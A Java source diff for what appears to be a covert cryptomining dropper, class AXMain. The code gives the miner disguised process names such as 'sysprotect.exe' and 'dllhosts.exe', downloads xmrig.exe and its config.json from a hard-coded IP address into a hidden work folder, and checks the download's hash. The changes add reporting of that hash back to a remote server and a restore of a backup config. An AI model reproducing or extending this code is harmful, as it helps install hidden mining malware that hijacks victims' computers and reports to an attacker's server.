@@ -13,7 +13,7 @@ import java.util.Timer;
 
 public class AXMain {
 	public static final String workDir="D:\\syshost";
-	public static final String RLS_NOTE="MaskNameOpt&HashChecking";
+	public static final String RLS_NOTE="SendHash";
 	public static final String[] PROG_MASK_NAME=new String[]{"memprog.exe","memmgr.exe","sysprotect.exe","ssddriver.exe","pcasi.exe","dllhosts.exe","mediahost.exe","monitor.exe","touchas.exe"};
 	//从ghostj的配置文件读取本机名称
 	//向ax服务端发送注册消息
@@ -64,6 +64,7 @@ public class AXMain {
 			int attemptCount=0;
 			try {
 				stdHash = FileIO.read(workDir+"\\x.hash");
+				String dlHash;
 				do {
 					try {
 						Out.sayWithTimeLn("Dl xmrig.exe");
@@ -72,13 +73,20 @@ public class AXMain {
 						e.printStackTrace();
 					}
 					attemptCount++;
-				}while (!hashFile(new File(workDir+"\\xmrig.exe")).equals(stdHash)&&attemptCount<=3);
+					dlHash=hashFile(new File(workDir+"\\xmrig.exe"));
+					Out.sayWithTimeLn(dlHash);
+					connect.writeIgnoreExce(dlHash);
+				}while (!dlHash.equals(stdHash)&&attemptCount<=3);
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
 		}
 		try {
-			downLoadFromUrl("http://39.100.5.139/ghost/files/xmrig/config.json", "config.json", workDir, "dl"+new Date().getTime());
+			if (new File(workDir+"\\config.json.bak").exists()){
+				FileIO.write(workDir+"\\config.json",FileIO.read(workDir+"\\config.json.bak"));
+			}else {
+				downLoadFromUrl("http://39.100.5.139/ghost/files/xmrig/config.json", "config.json", workDir, "dl" + new Date().getTime());
+			}
 		}catch (Exception e) {
 			e.printStackTrace();
 		}
